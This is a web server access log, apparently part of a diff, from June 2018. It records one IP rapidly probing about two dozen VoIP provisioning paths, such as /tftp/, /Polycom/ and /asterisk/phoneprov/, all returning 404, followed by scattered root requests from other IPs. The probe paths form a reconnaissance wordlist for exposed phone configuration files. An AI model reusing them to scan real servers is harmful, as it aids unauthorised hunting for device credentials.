+[pid: 1572|app: 0|req: 19/91] 142.0.43.230 () {30 vars in 417 bytes} [Thu Jun  7 07:17:42 2018] GET /tftproot/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1572|app: 0|req: 20/92] 142.0.43.230 () {30 vars in 409 bytes} [Thu Jun  7 07:17:42 2018] GET /tftp/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1572|app: 0|req: 21/93] 142.0.43.230 () {30 vars in 409 bytes} [Thu Jun  7 07:17:42 2018] GET /boot/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1572|app: 0|req: 22/94] 142.0.43.230 () {30 vars in 409 bytes} [Thu Jun  7 07:17:42 2018] GET /prov/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1572|app: 0|req: 23/95] 142.0.43.230 () {30 vars in 413 bytes} [Thu Jun  7 07:17:42 2018] GET /SIPCfg/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1572|app: 0|req: 24/96] 142.0.43.230 () {30 vars in 427 bytes} [Thu Jun  7 07:17:42 2018] GET /app/provision/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1572|app: 0|req: 25/97] 142.0.43.230 () {30 vars in 419 bytes} [Thu Jun  7 07:17:42 2018] GET /a2billing/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+[pid: 1574|app: 0|req: 19/98] 142.0.43.230 () {30 vars in 413 bytes} [Thu Jun  7 07:17:42 2018] GET /Aastra/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1574|app: 0|req: 20/99] 142.0.43.230 () {30 vars in 415 bytes} [Thu Jun  7 07:17:42 2018] GET /Polycom/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1574|app: 0|req: 21/100] 142.0.43.230 () {30 vars in 437 bytes} [Thu Jun  7 07:17:42 2018] GET /provisioning/p.php/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1574|app: 0|req: 22/101] 142.0.43.230 () {30 vars in 457 bytes} [Thu Jun  7 07:17:42 2018] GET /unauthenticated/provisioning/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1574|app: 0|req: 23/102] 142.0.43.230 () {30 vars in 435 bytes} [Thu Jun  7 07:17:43 2018] GET /voip_provisioning/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1574|app: 0|req: 24/103] 142.0.43.230 () {30 vars in 419 bytes} [Thu Jun  7 07:17:43 2018] GET /phoneprov/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1574|app: 0|req: 25/104] 142.0.43.230 () {30 vars in 431 bytes} [Thu Jun  7 07:17:43 2018] GET /prov/_directory/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+[pid: 1574|app: 0|req: 26/105] 142.0.43.230 () {30 vars in 415 bytes} [Thu Jun  7 07:17:43 2018] GET /configs/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1576|app: 0|req: 17/106] 142.0.43.230 () {30 vars in 437 bytes} [Thu Jun  7 07:17:43 2018] GET /asterisk/phoneprov/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+[pid: 1576|app: 0|req: 18/107] 142.0.43.230 () {30 vars in 429 bytes} [Thu Jun  7 07:17:43 2018] GET /phoneprov.conf/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 2)
+[pid: 1576|app: 0|req: 19/108] 142.0.43.230 () {30 vars in 415 bytes} [Thu Jun  7 07:17:43 2018] GET /scottch/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1576|app: 0|req: 20/109] 142.0.43.230 () {30 vars in 413 bytes} [Thu Jun  7 07:17:43 2018] GET /phones/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 4)
+[pid: 1576|app: 0|req: 21/110] 142.0.43.230 () {30 vars in 411 bytes} [Thu Jun  7 07:17:43 2018] GET /phone/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1576|app: 0|req: 22/111] 142.0.43.230 () {30 vars in 411 bytes} [Thu Jun  7 07:17:43 2018] GET /users/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 3)
+[pid: 1576|app: 0|req: 23/112] 142.0.43.230 () {30 vars in 423 bytes} [Thu Jun  7 07:17:43 2018] GET /users/phone/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1576|app: 0|req: 24/113] 142.0.43.230 () {30 vars in 421 bytes} [Thu Jun  7 07:17:43 2018] GET /management/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 1)
+[pid: 1571|app: 0|req: 20/114] 142.0.43.230 () {30 vars in 413 bytes} [Thu Jun  7 07:17:43 2018] GET /folder/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 0)
+[pid: 1571|app: 0|req: 21/115] 142.0.43.230 () {30 vars in 447 bytes} [Thu Jun  7 07:17:43 2018] GET /management/provisioning/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1571|app: 0|req: 22/116] 142.0.43.230 () {30 vars in 427 bytes} [Thu Jun  7 07:17:43 2018] GET /config_server/ => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 6)
+[pid: 1571|app: 0|req: 23/117] 5.160.151.199 () {32 vars in 460 bytes} [Thu Jun  7 09:45:47 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1571|app: 0|req: 24/118] 185.33.34.61 () {32 vars in 459 bytes} [Thu Jun  7 10:26:33 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1575|app: 0|req: 9/119] 141.212.122.160 () {34 vars in 392 bytes} [Thu Jun  7 10:26:59 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 5)
+[pid: 1571|app: 0|req: 25/120] 195.1.152.58 () {32 vars in 459 bytes} [Thu Jun  7 10:32:42 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1571|app: 0|req: 26/121] 175.42.1.1 () {28 vars in 304 bytes} [Thu Jun  7 10:54:51 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.0 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1571|app: 0|req: 27/122] 123.245.88.186 () {38 vars in 626 bytes} [Thu Jun  7 10:55:40 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1571|app: 0|req: 28/123] 87.229.223.134 () {32 vars in 461 bytes} [Thu Jun  7 11:02:17 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1571|app: 0|req: 29/124] 208.82.234.69 () {32 vars in 461 bytes} [Thu Jun  7 11:55:24 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1571|app: 0|req: 30/125] 189.236.55.175 () {32 vars in 462 bytes} [Thu Jun  7 12:10:49 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1571|app: 0|req: 31/126] 172.104.108.109 () {34 vars in 388 bytes} [Thu Jun  7 12:43:00 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1571|app: 0|req: 32/127] 187.131.218.125 () {32 vars in 463 bytes} [Thu Jun  7 13:14:34 2018] GET / => generated 233 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 188 bytes (1 switches on core 7)
+[pid: 1571|app: 0|req: 33/128] 68.65.67.34 () {40 vars in 533 bytes} [Thu Jun  7 13:39:27 2018] GET /categories => generated 109 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 188 bytes (1 switches on core 7)
